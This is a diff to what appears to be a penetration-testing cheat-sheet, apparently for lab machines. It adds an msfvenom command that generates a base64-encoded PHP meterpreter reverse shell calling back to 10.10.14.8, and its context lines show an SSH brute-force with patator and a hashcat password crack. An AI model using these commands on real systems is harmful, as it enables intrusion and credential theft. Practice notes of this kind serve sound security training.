@@ -266,6 +266,8 @@ python patator.py ssh_login host=10.10.10.76 port=22022 user=sunny password=FILE
 #crack hash  
 hashcat64.exe -a 0 -m 7400 -O -w 3 hash.txt rockyou.txt  
 
+#generate reverse shell metasploit     
+msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.14.8 LPOR=4444 -e php/base64 -f raw > shell.php  
 
 #fix grub   
 grub rescue > set root=(hd0,gpt6)  
